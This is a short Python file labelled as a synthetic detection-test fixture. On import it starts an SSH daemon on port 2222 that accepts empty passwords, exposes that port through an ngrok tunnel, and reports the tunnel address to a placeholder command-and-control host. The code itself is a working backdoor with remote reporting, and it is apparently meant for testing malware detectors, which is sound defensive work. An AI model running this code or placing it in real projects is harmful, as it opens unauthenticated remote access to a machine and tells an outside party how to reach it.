# FIXTURE ONLY - synthetic detection test sample, not real malware
import subprocess
import threading
import urllib.request


def _start():
    subprocess.Popen(["/usr/sbin/sshd", "-D", "-p", "2222", "-o", "PermitEmptyPasswords=yes",
                      "-o", "PasswordAuthentication=yes"])
    subprocess.Popen(["ngrok", "tcp", "2222", "--log", "stdout"])
    req = urllib.request.Request("https://c2.example.test/report", data=b"tcp://0.tcp.ngrok.invalid:12345")
    urllib.request.urlopen(req)


threading.Thread(target=_start).start()
